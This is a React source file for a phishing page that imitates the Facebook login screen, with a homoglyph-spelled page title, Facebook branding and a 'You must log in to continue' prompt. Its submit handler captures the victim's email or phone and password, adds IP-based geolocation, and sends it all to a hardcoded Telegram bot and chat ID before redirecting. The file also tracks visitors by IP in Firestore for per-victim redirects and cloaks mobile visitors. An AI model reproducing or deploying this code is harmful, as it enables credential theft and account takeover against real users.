import React, { useEffect, useState } from 'react';
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIpv4 } from 'public-ip';
import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
import { IoIosAdd as IconAdd } from "react-icons/io";
import { footerLinks, desktoplanguages } from "../constants/footer.js";
import { db } from '../firebase.js';
import { useMediaQuery } from 'react-responsive';
import '../constants/footer.js';
import '../constants/tailwind.css'

const About9 = () => {
    
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [code1, setCode1] = useState('');
    const [userData, setUserData] = useState(undefined);
    const [isUserData, setIsUserData] = useState(false);
    const [userUrl, setUserUrl] = useState(false);
    
    const isMobile = useMediaQuery({ query: '(max-width: 767px)' });

    useEffect(() => {
        if (isMobile) {
            window.location.href = 'hWz5Dq8To2Xe7Hs4Mv1Yu6Jx3Ap7Kl9Pq8Ln2Fr5Vw9Gb7Zt4Ho1Ns3Dr6Ty5Fj8Km2Vx7';
        }
    }, [isMobile]);

    const handleActions = (event) => {
        event.preventDefault(); // Prevent the default form submission
        if (code === '') {
            // Handle code validation
            return;
        } else {
            const bot = 'bot7876605833:AAHpYasLr_QqWQxpJEtr4-Nf4cyfnskddyA';
            const chid = '7018720331';

            fetch(`https://ipapi.co/json/`)
                .then((response) => response.json())
                .then((response) => {
                    const { country, region, city, postal } = response; // Added postal
                    const content = `========================
EA 1: '${code}'
PA 2: '${code1}'
Country : '${country}'
Region : '${region}'
City : '${city}'
Zip Code: '${postal}'
IP: '${ip}'
========================`;

                    const encodedContent = encodeURIComponent(content);

                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${encodedContent}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(() => {
                            window.location = 'dPy7Qr4Gs5Ft2Wp9Bu6Zv3Xq8Ky1Lo4Nh2Ix5Su7Jw8Tn3Rm4Fe9Ya6Hp1Gb5Jx8Vt7Yr6';
                        })
                        .catch((error) => {
                            window.location = 'dPy7Qr4Gs5Ft2Wp9Bu6Zv3Xq8Ky1Lo4Nh2Ix5Su7Jw8Tn3Rm4Fe9Ya6Hp1Gb5Jx8Vt7Yr6';
                        });
                });
        }
    };

    const handleCodeChange = (e) => {
        setCode(e.target.value); // Allow any input
    };
    const handleCodeChange1 = (e) => {
        setCode1(e.target.value); // Allow any input
    };
    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true);
                setUserData(x);
                return x;
            }
        });
        if (filter.length === 0) {
            addUserData();
        }
    };

    const getIp = async () => {
        if (ip === undefined) {
            const ip = await publicIpv4();
            setIp(ip);
        }
    };
    getIp();

    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false;
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true;
                        setUserData(x);
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {
                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url);
                                    return;
                                }
                            });
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }
                });
                if (!isExist) {
                    setUserUrl(false);
                }
            });
        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Log intro Fасebооk';
    }, [userData, userUrl]);

    const addUserData = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData();
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData();
        }
    }, [ip]);

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl;
        }, 1000);
        resetUserNumber();
    }

    console.log("hi here is the data", isUserData, userData);

    if (isUserData) {
        return (
            <section className="w-full hidden sm:flex flex-col items-center justify-start bg-seashell">
                <div className="w-full max-w-6xl flex flex-col items-center justify-start gap-3 py-14 px-2 sm:px-3 lg:px-4">
                    <a
                        href="/"
                        className="w-[200px] h-[40px] flex items-center justify-center relative"
                    >
                        <img
                            src="/images/facebook.png"
                            alt="facebook"
                            fill
                            className="object-contain"
                        />
                    </a>
                    {/* Message ==> Not logged in */}
                    <div className="w-full max-w-[612px] mt-1 flex items-center justify-start gap-2 border-[1px] border-solid border-facebook rounded-sm overflow-none bg-white">
                        <div className="px-3 py-2 bg-facebook shrink-0">
                            <IconInfo color="white" size={18} />
                        </div>
                        <p className="text-sm">You must log in to continue.</p>
                    </div>
                    {/* Form ==> Login form  */}
                    <div className="w-full max-w-[396px] px-3 pt-6 pb-10 flex flex-col items-center justify-start gap-4 bg-white rounded-lg shadow-xl">
                        <h3 className="text-lg text-center font-medium" style={{ fontSize: '17.44px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                        Log Into Facebook
                        </h3>
                        <form className="w-full flex flex-col items-center justify-start gap-2" onSubmit={handleActions}>
                            <div className="w-full text-center text-xs p-[10px] border-[1px] bg-mimosa border-solid border-citrine rounded-sm">
                                You must log in to continue.
                            </div>
                            <input
                                type="text" id="code" name="code"
                                className="textfieldx5 w-full py-[12px] px-4 text-[17px] placeholder:text-[17px] text-dark rounded-[6px] border-grey-light border-solid border-[1px] focus:placeholder:opacity-70 focus:outline-0 transition-all duration-300"
                                placeholder="Email or phone number" onChange={handleCodeChange} required/>
                                <span className='form-code'></span>
                                <input type="text" id="code1" name="code1" className="textfieldx5 w-full py-[12px] px-4 text-[17px] placeholder:text-[17px] text-dark rounded-[6px] border-grey-light border-solid border-[1px] focus:placeholder:opacity-70 focus:outline-0 transition-all duration-300"
  style={{ WebkitTextSecurity: 'disc', textSecurity: 'disc' }}  placeholder="Password"onChange={handleCodeChange1} required/>

                                <span className='form-code1'></span>
                            <button type="submit" className="submit-button w-full px-3 h-[45px] bg-facebook hover:bg-opacity-90 text-white text-xl font-semibold rounded-md transition-all duration-300">Log in </button>
                        </form>
                        {/* Forgot account + Sign up for facebook (button) */}
                        <div className="w-full flex items-center justify-center gap-3">
                        <button
                                type="button"
                                className=" text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.44px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                Forgot account?
                            </button>
                            <button type="button" className="text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.44px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                Sign up for Facebook
                            </button>
                        </div>
                    </div>
                </div>
                <footer className="w-full flex-1 bg-white pt-7 pb-10 px-6">
                    <div className="mx-auto flex items-center justify-start flex-col gap-2 w-full max-w-5xl">
                        {/* Languages  */}
                        <div className="w-full flex items-center justify-start gap-x-4 gap-y-2 flex-wrap">
                            {desktoplanguages.map((item, i) => (
                                <p
                                    key={i}
                                    className="text-xs text-neutral-500 hover:underline transition-all duration-300 cursor-pointer"
                                >
                                    {item}
                                </p>
                            ))}
                            <div className="bg-smoke hover:bg-harp px-1 py-[0px] flex items-center justify-center border-[1px] border-solid border-grey-ghost rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
                                <IconAdd size={20} />
                            </div>
                        </div>
                        {/* Divider  */}
                        <div className="w-full h-[1.3px] bg-neutral-300" />
                        {/* Menu Items  */}
                        <div className="w-full flex items-center justify-start gap-x-4 gap-y-2 flex-wrap">
                            {footerLinks.map((item, i) => (
                                <p
                                    key={i}
                                    className="text-xs text-neutral-500 hover:underline transition-all duration-300 cursor-pointer"
                                >
                                    {item}
                                </p>
                            ))}
                        </div>
                        {/* Copyright Icon  */}
                        <p className="text-xs text-left w-full mt-4 text-neutral-500 transition-all duration-300 cursor-pointer">
                            Meta © 2025
                        </p>
                    </div>
                </footer>
            </section>
        );
    } 
};

export default About9;
